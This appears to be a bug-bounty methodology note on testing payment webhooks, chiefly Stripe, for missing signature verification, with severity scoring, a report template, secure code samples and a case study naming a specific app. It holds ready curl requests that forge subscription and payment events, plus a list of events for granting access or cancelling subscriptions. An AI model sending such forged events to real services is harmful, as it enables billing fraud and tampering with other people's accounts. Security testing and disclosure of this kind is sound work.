# Webhook Signature Bypass Testing

## Overview

Payment/event webhook endpoints (Stripe, PayPal, Shopify, GitHub, etc.) that don't verify cryptographic signatures allow attackers to forge arbitrary events. This is CWE-345 (Insufficient Verification of Data Authenticity) and typically rates High severity.

## Detection Signals

- Laravel apps with `/stripe/webhook`, `/paypal/webhook`, `/shopify/webhook` paths
- Livewire/Sanctum apps (Laravel ecosystem — likely has Cashier/Stripe integration)
- Any endpoint accepting POST with JSON event payloads
- CSP headers mentioning `*.stripe.com` (indicates Stripe integration)
- JS bundles referencing Stripe publishable keys

## Testing Methodology

### Step 1: Identify webhook endpoint

```bash
# Common paths
/stripe/webhook
/webhooks/stripe
/api/webhooks/stripe
/billing/webhook
/payment/webhook
/hooks/stripe
```

### Step 2: Test without signature

```bash
curl -X POST "https://target.com/stripe/webhook" \
  -H "Content-Type: application/json" \
  -d '{"id":"evt_test","type":"customer.subscription.created","data":{"object":{"id":"sub_test","customer":"cus_test","status":"active"}}}'
```

**Interpretation:**
- `200 "Webhook Handled"` → NOT verifying signature (VULNERABLE)
- `400 "Invalid signature"` / `400 "No signatures found"` → Signature verified (SECURE)
- `404` → Wrong path
- `405` → Wrong method
- `419` → CSRF protected (Laravel without webhook exemption — unusual)

### Step 3: Test with fake signature

```bash
curl -X POST "https://target.com/stripe/webhook" \
  -H "Content-Type: application/json" \
  -H "Stripe-Signature: t=0,v1=completely_invalid" \
  -d '{"id":"evt_test","type":"customer.subscription.updated","data":{"object":{"id":"sub_test","customer":"cus_test","status":"active"}}}'
```

If this also returns 200 → confirms no signature validation at all.

### Step 4: Prove active processing (not just a 200 no-op)

Send an event that references a non-existent object:

```bash
curl -X POST "https://target.com/stripe/webhook" \
  -H "Content-Type: application/json" \
  -d '{"id":"evt_del","type":"customer.subscription.deleted","data":{"object":{"id":"sub_nonexistent","customer":"cus_nonexistent","status":"canceled"}}}'
```

**Key evidence:**
- `500` (server error) → App tried to process and crashed on DB lookup = **STRONG proof of active processing**
- `200` with different body text per event type → Processing logic exists
- `200` with identical response for all events → Might be a no-op catch-all (weaker finding)

### Step 5: Test all relevant event types

```bash
# Subscription manipulation
customer.subscription.created    # Grant premium access
customer.subscription.updated    # Change plan tier
customer.subscription.deleted    # Cancel someone's subscription

# Payment manipulation
checkout.session.completed       # Mark checkout as paid
payment_intent.succeeded         # Confirm payment
invoice.payment_succeeded        # Mark invoice paid
invoice.paid                     # Alternative invoice event

# Account manipulation
customer.created                 # Create customer record
customer.deleted                 # Delete customer record
```

## Severity Assessment

| Factor | High | Medium | Low |
|--------|------|--------|-----|
| Processes subscription events | ✓ | | |
| Processes payment events | ✓ | | |
| Only processes non-sensitive events (e.g., `ping`) | | | ✓ |
| Requires valid customer_id to target specific users | Stays High | | |
| Customer IDs enumerable | → Critical | | |
| No evidence of active processing (just 200 OK) | | ✓ | |

## CVSS Calculation

Typical: **AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:N = 8.6 (High)**

- Network accessible, no auth needed, no user interaction
- Scope Changed (affects billing/subscription system beyond the webhook endpoint)
- Integrity High (can modify subscription/payment state)
- If customer IDs are enumerable: add C:L (can probe which IDs exist via 200 vs 500 differential)

## Report Template (Intigriti/HackerOne)

**Title:** Stripe Webhook Signature Bypass on [target] Allows Forging Payment Events

**Key sections:**
1. Show request WITHOUT signature → 200
2. Show request WITH fake signature → 200
3. Show differential response proving active processing (200 vs 500)
4. Table of all event types confirmed processed
5. Impact: upgrade accounts, cancel subscriptions, mark invoices paid
6. Remediation: implement `\Stripe\Webhook::constructEvent()` (Laravel) or equivalent

## Platform-Specific Verification Code

### Laravel (Cashier)
```php
// SECURE pattern
$event = \Stripe\Webhook::constructEvent(
    $payload, $sig_header, $endpoint_secret
);
```

### Node.js
```javascript
// SECURE pattern
const event = stripe.webhooks.constructEvent(
    req.body, sig, endpointSecret
);
```

### Python (Flask/Django)
```python
# SECURE pattern
event = stripe.Webhook.construct_event(
    payload, sig_header, endpoint_secret
)
```

## Lessons Learned

### SnapShooter/DigitalOcean (2026-05-27)
- Laravel app (Livewire, Sanctum, Horizon) at app.snapshooter.com
- `/stripe/webhook` accepted ALL events without any signature check
- `customer.subscription.deleted` returned 500 (strongest proof — app crashed on non-existent customer lookup)
- `checkout.session.completed` and `payment_intent.succeeded` returned 200 silently
- Registration existed but required email verification — couldn't prove account upgrade on own account
- Reported as High (CVSS 8.6) — customer_id needed for targeted attacks prevents Critical
